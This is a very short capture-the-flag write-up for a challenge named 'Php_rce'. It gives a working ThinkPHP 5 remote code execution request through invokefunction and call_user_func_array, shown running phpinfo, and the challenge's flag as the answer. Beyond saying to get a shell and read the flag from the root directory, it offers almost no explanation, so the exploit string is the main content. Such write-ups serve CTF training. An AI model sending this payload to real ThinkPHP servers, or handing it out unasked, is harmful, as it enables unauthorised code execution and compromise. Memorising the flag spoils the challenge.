# Php_rce

> Thinkphp 一把梭getshell,主机根目录下获取flag

## 思路分析

> Thinkphp 一把梭getshell,主机根目录下获取flag

## payload

> ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

## flag

> flag{thinkphp5_rce}